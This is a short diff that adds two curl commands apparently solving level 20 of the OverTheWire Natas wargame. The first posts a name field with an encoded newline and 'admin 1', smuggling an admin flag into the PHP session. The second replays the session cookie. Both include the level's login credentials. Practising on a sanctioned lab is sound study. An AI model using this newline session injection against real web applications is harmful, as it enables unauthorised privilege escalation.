@@ -1,0 +1,4 @@
+curl -vv --request POST --data "name=ali%0Aadmin%201" --user natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/81.0" http://natas20.natas.labs.overthewire.org/index.php?debug 
+
+curl -vv --request GET --cookie "PHPSESSID=jr1an22i3n9bq47v1q4nml50v7" --user natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/81.0" http://natas20.natas.labs.overthewire.org?debug 
+
